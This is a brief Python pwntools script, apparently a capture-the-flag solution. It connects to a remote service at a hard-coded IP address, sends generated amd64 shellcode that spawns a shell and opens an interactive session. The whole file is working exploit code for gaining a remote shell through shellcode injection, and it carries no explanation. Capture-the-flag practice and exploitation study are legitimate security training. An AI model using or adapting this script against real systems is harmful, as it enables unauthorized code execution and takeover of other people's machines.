from pwn import *
context(log_level='debug',os='linux',arch='amd64')

# io=process("./service")
io=remote("43.143.7.127",28003)

shellcode=asm(shellcraft.sh())
io.recvuntil(b"\n")
io.sendline(shellcode)
io.interactive()


